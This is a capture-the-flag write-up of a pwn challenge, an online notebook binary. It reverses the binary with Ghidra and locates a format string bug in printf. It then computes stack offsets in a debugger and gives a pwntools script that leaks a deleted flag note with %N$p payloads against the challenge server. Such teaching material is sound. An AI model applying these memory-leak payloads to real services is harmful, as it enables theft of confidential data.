# Heathrow - Secret Warehouse
Category: Pwn

## Description

> Wow, it’s a crowded day at Heathrow, lots of suits that bump into each other and try to catch their plane. You have to find the gate to the secret warehouse, it cannot be far away. You see a suspicious suit go into a fast food court and you spot him disappear behind the checkout. Hmmm, odd?! You follow, and when no one sees you follow him. You go through a desolated kitchen, it stinks, you cover your nose with the back of your hand. You pass through a small entrance, and enter the secret warehouse, wow, it’s vast!
> 
> Challenge: pwn-notebook (pwn)
> 
> Please help me restore my deleted note.

An executable was attached.

## Solution

The executable (and remote service) offer an online notebook:

```console
┌──(user@kali)-[/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehouse]
└─$ nc pwn-notebook.2021.ctfcompetition.com 1337
== proof-of-work: disabled ==
This is your confidential notebook.
This should get you through the next mission!
Good luck!

Please choose what you want to do:
1. List built-in note metadata.
2. Print out a built-in note.
3. Make a draft your note.
4. Add note to notebook.
5. Delete note.
9. Quit.
>
```

We can list the existing notes:

```
> 1
Here's a list of our notes:
 - 00. length: 037, state: LIVE
 - 01. length: 038, state: LIVE
 - 02. length: 055, state: LIVE
 - 03. length: 040, state: DELETED
 - 04. length: 044, state: LIVE
 - 05. length: 000, state: DELETED
 - 06. length: 000, state: DELETED
 - 07. length: 000, state: DELETED
 - 08. length: 000, state: DELETED
 - 09. length: 000, state: DELETED
```

Print a note:

```
> 2
Which note would you like to print out? 0
 _______________________________________
< Shipping manifest #1337: Thingomabobs >
 ---------------------------------------
   \    /\_/\
    \  ( o.o )
        > ^ <
```

Make a note draft:

```
> 3
Quote: Test
 ______
< Test >
 ------
   \    /\_/\
    \  ( o.o )
        > ^ <
```

Add a new note:

```
> 4
Note: New Note
```

Or delete a note:

```
> 5
Which note would you like to delete? 2
Deleted.
```

Notice how the list of notes contained a deleted note with a length of `40`:

```
 - 03. length: 040, state: DELETED
```

When we try to print it, we get:

```
Please choose what you want to do:
1. List built-in note metadata.
2. Print out a built-in note.
3. Make a draft your note.
4. Add note to notebook.
5. Delete note.
9. Quit.
> 2
Which note would you like to print out? 3
 _________
< DELETED >
 ---------
   \    /\_/\
    \  ( o.o )
        > ^ <
```

We must find a different way to print it.

Time to reverse the program with Ghidra:

```c

DAT_001030e9 = "%d";

struct note_t {
    char note[512];
    int is_free;
};

void read_notes(note_t *p_notes)
{
  int iVar1;
  FILE *__stream;
  int i;
  
  i = 0;
  __stream = fopen("notes.txt","r");
  for (; i < 10; i = i + 1) {
    iVar1 = __isoc99_fscanf(__stream,"%511[^\n]%*c",p_notes + i);
    if (iVar1 == -1) break;
    p_notes[i].is_free = 0;
  }
  fclose(__stream);
  return;
}

void list(note_t *p_notes)
{
  size_t note_len;
  char *state;
  uint i;
  
  puts("Here\'s a list of our notes:");
  for (i = 0; (int)i < 10; i = i + 1) {
    if (p_notes[(int)i].is_free == 1) {
      state = "DELETED";
    }
    else {
      state = "LIVE";
    }
    note_len = strlen((char *)(p_notes + (int)i));
    printf(" - %02d. length: %03d, state: %s\n",(ulong)i,note_len,state);
  }
  return;
}

void catsay(char *param_1)
{
    // ... print note with figure of cat ...
}

void print_note(note_t *p_notes)
{
  char *p_note_content;
  long in_FS_OFFSET;
  int note_index;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Which note would you like to print out? ");
  __isoc99_scanf(&DAT_001030e9,&note_index);
                    // Bad boundry check: negative
  if (note_index < 10) {
    if (p_notes[note_index].is_free == 1) {
      p_note_content = "DELETED";
    }
    else {
      p_note_content = (char *)(p_notes + note_index);
    }
    catsay(p_note_content);
  }
  else {
    puts("This note doesn\'t exist. Try again. ");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}

void draft_note(void)
{
  long i;
  undefined8 *p_note_chunk;
  long in_FS_OFFSET;
  char format [32];
  char note [520];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  note._0_8_ = 0;
  note._8_8_ = 0;
  p_note_chunk = (undefined8 *)(note + 0x10);
  for (i = 62; i != 0; i = i + -1) {
    *p_note_chunk = 0;
    p_note_chunk = p_note_chunk + 1;
  }
  format._0_8_ = 0;
  format._8_8_ = 0;
  format._16_8_ = 0;
  format._24_8_ = 0;
  printf("Quote: ");
  snprintf(format,31,"%%%ds",511);
  __isoc99_scanf(format,note);
  catsay(note);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}

void add_note(note_t *p_notes)
{
  long lVar1;
  long in_FS_OFFSET;
  int i;
  char format [32];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  format._0_8_ = 0;
  format._8_8_ = 0;
  format._16_8_ = 0;
  format._24_8_ = 0;
  i = 0;
  while ((i < 10 && (p_notes[i].is_free != 1))) {
    i = i + 1;
  }
  if (i < 10) {
    printf("Note: ");
    snprintf(format,31,"%%%ds",511);
    __isoc99_scanf(format,p_notes + i);
    p_notes[i].is_free = 0;
  }
  else {
    puts("Sorry, there are no available slots. Please delete something");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}

void delete_note(note_t *p_notes)
{
  long in_FS_OFFSET;
  int note_index;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Which note would you like to delete? ");
  __isoc99_scanf(&DAT_001030e9,&note_index);
                    // Bad boundry check: 10, negative.
                    // -1 will override i from main?
  if (note_index < 11) {
    p_notes[note_index].is_free = 1;
    puts("Deleted.");
  }
  else {
    puts("Out of bounds. Try again.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}

void menu(void)
{
  puts("Please choose what you want to do:");
  puts("1. List built-in note metadata.");
  puts("2. Print out a built-in note.");
  puts("3. Make a draft your note.");
  puts("4. Add note to notebook.");
  puts("5. Delete note.");
  puts("9. Quit.");
  printf("> ");
  return;
}

undefined8 main(void)
{
  long lVar1;
  long in_FS_OFFSET;
  int user_choice;
  int i;
  note_t notes [10];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  for (i = 0; i < 10; i = i + 1) {
    notes[i].is_free = 1;
    notes[i].note[0] = '\0';
  }
  read_notes(notes);
  notes[3].is_free = 1;
  user_choice = 0;
  puts("This is your confidential notebook.");
  puts("This should get you through the next mission!");
  puts("Good luck!\n");
  do {
    if (user_choice == 9) {
      catsay("Byezzz!!!");
      if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
        __stack_chk_fail();
      }
      return 0;
    }
    menu();
    __isoc99_scanf(&DAT_001030e9,&user_choice);
    switch(user_choice) {
    default:
      printf("Unknown option. Please choose again.");
      break;
    case 1:
      list(notes);
      break;
    case 2:
      print_note(notes);
      break;
    case 3:
      draft_note();
      break;
    case 4:
      add_note(notes);
      break;
    case 5:
      delete_note(notes);
      break;
    case 9:
      break;
    }
  } while( true );
}
```


Reviewing the code, we notice that the notes are saved in an array of 10 `note_t` members, which allocated 512 bytes for the note and an extra DWORD used as a boolean for indicating if the note is free.

We also can locate the following bugs in the implementation:

 1. `delete_note` tests `note_index < 11` instead of `note_index < 10`, allowing us to write outside the note array: `p_notes[10].is_free = 1`.
 2. `delete_note` and `print_note` read a signed integer via `scanf`, but don't check the index for negativity, allowing to leak some data or write a `1` via `note_t` aligned addresses.

However, these bugs turn out to be dead ends. The real vulnerability is much simpler: A format string vulnerability!

```
> 3
Quote: %x
 ____
< eb6cd008 >
 ----
   \    /\_/\
    \  ( o.o )
        > ^ <
```

In order to exploit it, let's debug the program and check how far the leak is in relation to the note array. We'll use the functionality in `read_notes` to initialize our local copy with a few notes:

```console
┌──(user@kali)-[/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehouse]
└─$ echo "First note\nSecond note\nThird note\nCTF{Fake_flag}\nFifth note" > notes.txt

┌──(user@kali)-[/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehouse]
└─$ ./notebook
This is your confidential notebook.
This should get you through the next mission!
Good luck!

Please choose what you want to do:
1. List built-in note metadata.
2. Print out a built-in note.
3. Make a draft your note.
4. Add note to notebook.
5. Delete note.
9. Quit.
> 1
Here's a list of our notes:
 - 00. length: 010, state: LIVE
 - 01. length: 011, state: LIVE
 - 02. length: 010, state: LIVE
 - 03. length: 014, state: DELETED
 - 04. length: 010, state: LIVE
 - 05. length: 000, state: DELETED
 - 06. length: 000, state: DELETED
 - 07. length: 000, state: DELETED
 - 08. length: 000, state: DELETED
 - 09. length: 000, state: DELETED
Please choose what you want to do:
1. List built-in note metadata.
2. Print out a built-in note.
3. Make a draft your note.
4. Add note to notebook.
5. Delete note.
9. Quit.
> 2
Which note would you like to print out? 3
 _________
< DELETED >
 ---------
   \    /\_/\
    \  ( o.o )
        > ^ <
Please choose what you want to do:
1. List built-in note metadata.
2. Print out a built-in note.
3. Make a draft your note.
4. Add note to notebook.
5. Delete note.
9. Quit.
> 9
 ___________
< Byezzz!!! >
 -----------
   \    /\_/\
    \  ( o.o )
        > ^ <

```

Notice how the forth note (`CTF{Fake_flag}`) is marked as deleted due to the command executed right after `read_notes`: `notes[3].is_free = 1;`.

Now we need to identify the `printf` that's responsible for the format string vulnerability. It's buried somewhere within `catsay`, in a function called `print_line`:

```c
int print_line(char *param_1,char *param_2,char *param_3,int param_4)
{
  // ...
  strncpy((char *)&local_48,param_1,4);
  strncat((char *)&local_48,param_2,(long)local_50);
  //...
  strncat((char *)&local_48,local_70,4);
  //...
  printf((char *)&local_48);
  //...
}
```

Time to debug. We place a breakpoint at `print_line`'s `printf` and run. We then enter a draft of `%p.%p.%p.%p.%p.%p.%p.%p` to leak a few values from the stack, and hit the breakpoint. At this point we dump the stack with the debugger:

```
gef>  stack 200
0x00007fffffffce60│+0x0000: 0x00000017f7fb1540   ← $rsp
0x00007fffffffce68│+0x0008: 0x0000555555557008  →  0x5c2000203c003e20 (">"?)
0x00007fffffffce70│+0x0010: 0x00007fffffffcf10  →  "%p.%p.%p.%p.%p.%p.%p.%p"
0x00007fffffffce78│+0x0018: 0x000055555555700b  →  0x202f005c2000203c ("< "?)
0x00007fffffffce80│+0x0020: 0x000000000000000a
0x00007fffffffce88│+0x0028: 0x0000000000000017
0x00007fffffffce90│+0x0030: "< %p.%p.%p.%p.%p.%p.%p.%p >\n"      ← $rdi
0x00007fffffffce98│+0x0038: "%p.%p.%p.%p.%p.%p >\n"
0x00007fffffffcea0│+0x0040: ".%p.%p.%p >\n"
0x00007fffffffcea8│+0x0048: 0x000000000a3e2070 ("p >\n"?)
0x00007fffffffceb0│+0x0050: 0x0000000000000000
0x00007fffffffceb8│+0x0058: 0x0000000000000000
0x00007fffffffcec0│+0x0060: 0x00007fffffff0000  →  0x0000000000000000
0x00007fffffffcec8│+0x0068: 0xc545c1ab5ecb2800
0x00007fffffffced0│+0x0070: 0x00007fffffffd120  →  0x00007fffffffd360  →  0x00007fffffffe7c0  →  0x00005555555560e0  →  <__libc_csu_init+0> endbr64      ← $rbp
0x00007fffffffced8│+0x0078: 0x0000555555555800  →  <catsay+287> jmp 0x5555555558b8 <catsay+471>
0x00007fffffffcee0│+0x0080: 0x00007fffffffd130  →  0x0000007331313525 ("%511s"?)
0x00007fffffffcee8│+0x0088: 0x00007fffffffd150  →  "%p.%p.%p.%p.%p.%p.%p.%p"
0x00007fffffffcef0│+0x0090: 0x00007fffffffd130  →  0x0000007331313525 ("%511s"?)
0x00007fffffffcef8│+0x0098: 0x0000001700000001
...
0x00007fffffffd350│+0x04f0: 0x0000000000000000
0x00007fffffffd358│+0x04f8: 0xc545c1ab5ecb2800
0x00007fffffffd360│+0x0500: 0x00007fffffffe7c0  →  0x00005555555560e0  →  <__libc_csu_init+0> endbr64
0x00007fffffffd368│+0x0508: 0x000055555555606c  →  <main+449> jmp 0x5555555560a2 <main+503>
0x00007fffffffd370│+0x0510: 0x00007fffffffe8b8  →  0x00007fffffffeb44  →  "/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehou[...]"
0x00007fffffffd378│+0x0518: 0x0000000100000000
0x00007fffffffd380│+0x0520: 0x0000000000000000
0x00007fffffffd388│+0x0528: 0x0000000a00000003
0x00007fffffffd390│+0x0530: "First note"
0x00007fffffffd398│+0x0538: 0x0000000000006574 ("te"?)
...
```

Now, stepping over the `printf`, we get the following output from the program:

```
gef>  ni
< 0x555555557008.0x1b.0xffffffffffffffe3.0x4.0x252e70252e70252e.0x17f7fb1540.0x555555557008.0x7fffffffcf10 >
```

Now we match the output from `printf` to the stack: We can see that `0x17f7fb1540` is the first value from `printf` that appears in the stack dump, meaning that we need to adjust our `printf` offset to account for the 5 values printed before it. We also see that `First note` appears at `0x00007fffffffd390│`, so: `(0x00007fffffffd390 - 0x00007fffffffce60) / 8 == 166`. Altogether we get 172 QWORDs until the first note, let's double check that:

```
> 3
Quote: %172$p
 ________
< 0x6f6e207473726946 >
 --------
   \    /\_/\
    \  ( o.o )
        > ^ <
```

Which verifies our calculation:

```console
┌──(user@kali)-[/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehouse]
└─$ python3 -c 'print(bytes.fromhex("6f6e207473726946")[::-1])'
b'First no'
```

Now, we want to jump from the first note to the forth one, so we need to add: `(sizeof(note_t) * 3) / 8 == 193`, which gives us overall: `172 + ((516 * 3) // 8) == 365`.

In order to recover the deleted note, we'll use the following script (which dumps QWORDs starting from offset `365` and takes care of reversing the output string due to the endianness):

```python
# First, generate a pwntools exploit via:
#  pwn template --host pwn-notebook.2021.ctfcompetition.com --port 1337 ./notebook
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def read_menu(io):
    io.recvuntil(b'> ')

def make_draft(io, draft):
    read_menu(io)
    io.sendline(b'3')
    io.recvuntil(b'Quote: ')
    io.sendline(draft.encode())
    io.recvuntil(b'< ')
    res = io.recvuntilS(b' >', drop = True)
    log.info(f"Creating draft: Sent: {draft}, got: {res}")
    return res

io = start()

BASE_OFFSET = 365
note = ""
offset = 0

while "}" not in note:
    res = format(int(make_draft(io, f"%{BASE_OFFSET + offset}$p"), 16), 'x')
    decoded = unhex(res.rstrip('0')).decode()[::-1]
    offset += 1
    note += decoded

log.success(f"Deleted note recovered: '{note}'")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehouse]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehouse/notebook'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn-notebook.2021.ctfcompetition.com on port 1337: Done
[*] Creating draft: Sent: %365$p, got: 0x696d655200000000
[*] Creating draft: Sent: %366$p, got: 0x5443203a7265646e
[*] Creating draft: Sent: %367$p, got: 0x74616d726f667b46
[*] Creating draft: Sent: %368$p, got: 0x5f676e697274735f
[*] Creating draft: Sent: %369$p, got: 0x5f6568745f726f66
[*] Creating draft: Sent: %370$p, got: 0x7d6e6977
[+] Deleted note recovered: 'Reminder: CTF{format_string_for_the_win}'
[*] Closed connection to pwn-notebook.2021.ctfcompetition.com port 1337
```